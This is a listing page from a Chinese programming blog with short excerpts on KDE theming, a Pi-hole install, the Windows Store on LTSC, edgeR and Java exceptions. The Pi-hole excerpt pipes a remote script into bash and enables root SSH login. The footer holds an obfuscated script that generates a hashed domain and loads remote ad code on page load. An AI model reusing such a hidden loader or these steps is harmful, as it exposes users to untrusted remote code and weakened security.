免费算力 本次比赛提供免费版 2核 8G CPU 供参赛选手使用，报名后进入组织即可使用。
【参考代码】回归 import pandas as pd from sklearn.model_selection import train_test_split #from sklearn.neighbors import KNeighborsClassifier from sklearn.linear_model import LinearRegression #线性回归 import time import numpy as np from sklearn.preprocessing import MinMaxScaler t_start = time.time() #1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5eff1089d4eaf7ac672d49c5e4e6581/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/110c22f707b5e5a33e4009c86ae85f30/" rel="bookmark">
			KDE 美化(Manjaro)-记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KDE 美化(Manjaro) 要想在不同的工具包之间获得相似的外观，你很可能需要修改以下内容：
主题 - 包含一套风格、图标主题和颜色主题。风格 - 图形布置，观感。图标主题 - 一套整体的图标。颜色主题 - 一套连接风格的整体配色。 主题引擎 可以认为是从一个或多个工具翻译主题（图标除外）很小的API层。这些引擎为进程添加额外的代码，这种解决方案不是非常精致更多为本来风格优化[1]。
主题 图标 布局 参考：https://www.pling.com/find/?search=latte&amp;f=tags
Latte Dock Warning: The version needed for these layouts to work properly is the Git version of Latte Doc; This Git version brings extra functions that the normal version does not have, such as floating dock, rounded corners, the Sidebar Widget, etc …
So in the normal versions of the repositories, non-Git version, these functions will have no effect and the Layout will not work correctly, for this reason it is necessary to install the Git version of Latte Dock.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/110c22f707b5e5a33e4009c86ae85f30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3c5a577535b1415651d31dbca1eb9fe/" rel="bookmark">
			PVE 安装Pi-hole
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一. Pi-Hole简介
相信大家已经对Pi-Hole都有耳闻了，这里再简单介绍下。Pi-Hole是一个开源免费的DNS服务器构建软件，它的特殊之处就是对于广告地址的DNS进行解析屏蔽，所以客户端电脑/手机/平板等不用安装任何软件，只要把本机的DNS解析服务指向Pi-Hole服务器地址即可，适用于任何操作系统。可简略的认为是广告屏蔽DNS服务器。
二. 安装过程
下载LXC容器模板Debian10，方法不再赘述。
根据LXC容器模板创建CT，CT启动后为了方便远程管理安装软件等，我们需要启用root远程SSH登陆服务器功能。
Debian系统一般默认不允许root进行ssh登录，或者默认都没有安装ssh服务。
a. 安装ssh-service
apt install ssh
b. 修改配置文件
vi /etc/ssh/sshd_config
c. 光标移到文档末尾按下o键添加一行，输入如下字符，然后按下Esc键，按下：（冒号）输入wq命令保存并退出
PermitRootLogin yes
d. 重启服务
systemctl restart ssh
安装curl命令支持
apt-get install curl
如果运行此命令失败，用apt update命令更新下程序数据库。
安装Pi-Hole
curl -sSL https://install.pi-hole.net | bash
如果出现如下提示，表明GitHub的raw.githubusercontent.com域名解析被污染了。
可通过修改hosts解决此问题。
查询真实IP，在https://www.ipaddress.com/查询raw.githubusercontent.com的真实IP。
修改hosts
vi /etc/hosts
添加如下内容：
199.232.68.133 raw.githubusercontent.com
重新执行Pi-Hole安装命令
curl -sSL https://install.pi-hole.net | bash
出现如下画面就表示可以正常安装。途中跳出的图形界面选取默认值即可，如果需要光标跳转记得使用“Tab”键。
安装完成后出现如下画面：
上面的Web Interface password非常难记，所以我们要修改密码，用如下命令
pihole -a -p
用浏览器登录如上图片提示的服务器web管理页面（http://192.168.137.2/admin），login刚才修改过的密码，点开Tools→Update Gravity菜单更新过滤列表，最后可以看到如下更新成功的提示。
至此Pi-Hole安装全部结束。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2db7b0362d9f0319ae9925385eefd710/" rel="bookmark">
			windows 10 ltsc 安装微软商店
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介
windows 10 最干净的版本是 ltsc和之前的ltsb, 推荐大家安装windows 10 ltsc
安装完了之后，你会发现，微软商店没得， 那咋办嘛。
没有微软商店的windows 10， 体验是不完整的。 很多软件，比如onenote等，都是需要从软件商店下载安装的。
打造最干净的windows 10, ltsc安装微软商店
下载微软商店
已经有高手把微软商店软件，从其他拥有微软商店的系统里剥离出来了。 我们只需要下载他们打包好的软件包，就可以方便快捷的恢复微软商店的功能
要开始安装, 请从github下载， 打包下载后用右键管理员运行 Add-Store.cmd
如果您不想安装App Installer / Purchase App / Xbox，请在运行安装之前删除对应的.appxbundle后缀的文件。但是，如果您计划安装游戏，或带有购买选项的应用，则不要删除。
如果装完之后商店仍然打不开，请先重启试试。如果仍然不行，请以管理员身份打开命令提示符并运行以下命令之后，然后再重启试试。
1PowerShell -ExecutionPolicy Unrestricted -Command “&amp; {$manifest = (Get-AppxPackage Microsoft.WindowsStore).InstallLocation + ‘\AppxManifest.xml’ ; Add-AppxPackage -DisableDevelopmentMode -Register $manifest}”
商店修复
Win+R打开运行，输入WSReset.exe回车。
该命令会清空并重置Windows Store商店的所有缓存。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/678231cac96f7d9feb3b367bf8f9e7e6/" rel="bookmark">
			转录组分析流程：表达差异分析之edgeR
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		edgeR edgeR是非常经典的转录组表达差异分析软件。
样本量：72个转录组样本
library(edgeR) library(HTSFilter) fc &lt;- read.table('counts.txt',header=1,row.names="Geneid") #counts矩阵，有表头 group &lt;- as.factor(strsplit2(colnames(fc),"_")[,1]) #分组信息，与Coutns文件列名相应 y &lt;- DGEList(counts=fc,group=group) keep &lt;- rowSums(cpm(y)&gt;1)&gt;=2 #过滤，至少在2个样本中的cpm值大于1，由于样本量较多，这里取了比较宽松的阈值。 y &lt;- y[keep,,keep.lib.sizes=FALSE] y &lt;- calcNormFactors(y) design &lt;- model.matrix(~0+group) colnames(design) &lt;- levels(group) # 设计比较矩阵，格式“name1 = Case - Control”，Case/Control 的名字与group 因子相同 mycontrasts &lt;- makeContrasts(C1vsC0=C1-C0,C2vsC1=C2-C1,C3vsC2=C3-C2,C4vsC3=C4-C3,C5vsC4=C5-C4,G1vsG0=G1-G0,G2vsG1=G2-G1,G3vsG2=G3-G2,G4vsG3=G4-G3,G5vsG4=G5-G4,STS1vsSTS0=STS1-STS0,STS2vsSTS1=STS2-STS1,STS3vsSTS2=STS3-STS2,STS4vsSTS3=STS4-STS3,STS5vsSTS4=STS5-STS4,YZ1vsYZ0=YZ1-YZ0,YZ2vsYZ1=YZ2-YZ1,YZ3vsYZ2=YZ3-YZ2,YZ4vsYZ3=YZ4-YZ3,YZ5vsYZ4=YZ5-YZ4,C0vsG0=C0-G0,C1vsG1=C1-G1,C2vsG2=C2-G2,C3vsG3=C3-G3,C4vsG4=C4-G4,C5vsG5=C5-G5,YZ0vsG0=YZ0-G0,YZ1vsG1=YZ1-G1,YZ2vsG2=YZ2-G2,YZ3vsG3=YZ3-G3,YZ4vsG4=YZ4-G4,YZ5vsG5=YZ5-G5,C0vsSTS0=C0-STS0,C1vsSTS1=C1-STS1,C2vsSTS2=C2-STS2,C3vsSTS3=C3-STS3,C4vsSTS4=C4-STS4,C5vsSTS5=C5-STS5,YZ0vsSTS0=YZ0-STS0,YZ1vsSTS1=YZ1-STS1,YZ2vsSTS2=YZ2-STS2,YZ3vsSTS3=YZ3-STS3,YZ4vsSTS4=YZ4-STS4,YZ5vsSTS5=YZ5-STS5,C0vsYZ0=C0-YZ0,C1vsYZ1=C1-YZ1,C2vsYZ2=C2-YZ2,C3vsYZ3=C3-YZ3,C4vsYZ4=C4-YZ4,C5vsYZ5=C5-YZ5,G0vsSTS0=G0-STS0,G1vsSTS1=G1-STS1,G2vsSTS2=G2-STS2,G3vsSTS3=G3-STS3,G4vsSTS4=G4-STS4,G5vsSTS5=G5-STS5,levels=design) y &lt;- estimateDisp(y,design) fit &lt;- glmQLFit(y,design) #一个函数用于批量导出比对结果 function_edgeR &lt;- function(i) { acontrast &lt;- mycontrasts[,i] qlf &lt;- glmQLFTest(fit,contrast=acontrast) write.table(qlf$table, file=paste(colnames(mycontrasts)[i],'txt',sep='.'),row.names=TRUE,col.names=TRUE,quote=F) } mapply(function_edgeR,i=seq(1,length(colnames(mycontrasts)))) #输出CPM write.table(cpm(y), file="cpm_all.txt",row.names=TRUE,col.names=TRUE,quote=F) #输出FPKM gene &lt;- read.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/678231cac96f7d9feb3b367bf8f9e7e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df800bfb7f33f9483276d4bbc050c42/" rel="bookmark">
			Java异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java异常处理 什么是异常异常体系结构Error&amp;Exception Java异常处理机制自定义异常总结 什么是异常 异常：Exception 异常指程序运行中出现的各种不理想状况，如：文件找不到、网络连接失败、非法参数等异常发生在程序运行期间，它影响了正常的程序执行流程检查性异常：由用户错误或问题引起的异常，这是程序员无法预见的，例如要打开一个不存在的文件时，异常就发生了，这些异常在编译时不能被简单的忽略运行时异常：运行时异常是可能被程序员避免的异常，运行时异常在编译时可以被忽略错误(err0r)：错误不是异常，而是脱离程序员控制的问题，错误在代码中通常被忽略，例如：当栈溢出时，错误就发生了，编译也检查不到 异常体系结构 Java把异常当作对象来处理，并定义一个基类 java.lang.Throwable 作为所有异常的超类 在 Java API 中已经定义了许多异常类，分为两大类，错误 Error 和异常 Exception Error&amp;Exception Error类对象由Java虚拟机生成并抛出，大多数错误与代码编写者所执行的操作无关在Exception分支中有一个重要的子类RuntimeException(运行时异常)这类异常一般是由程序逻辑错误引起的，程序应该从逻辑角度尽可能避免这类异常的发生Error和Exception的区别:Error通常是灾难性的致命错误，是程序无法控制和处理的，当出现这些异常时，Java虚拟机（JVM）一般会选择终止线程；Exception通常是可以被程序处理的，并且在程序中应该尽可能的去处理这些异常。 Java异常处理机制 抛出异常捕获异常 异常处理的五个关键字： try,catch,finally,throw,throws package dengaku; public class Test { public static void main(String[] args) { try { //监控区域 } catch (Error e) { //捕获异常后执行的语句 } catch (Throwable e) { //捕获异常后执行的语句,捕获异常由小到大 } finally { //处理善后工作（可选项） } } //在方法上抛出异常(throws) public void test(int a) throws ArithmeticException { if(a==0){ //主动抛出异常(throw) throw new ArithmeticException(); } } } 自定义异常 用户自定义异常，只需继承Exception类
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6df800bfb7f33f9483276d4bbc050c42/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/367/">«</a>
	<span class="pagination__item pagination__item--current">368/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/369/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>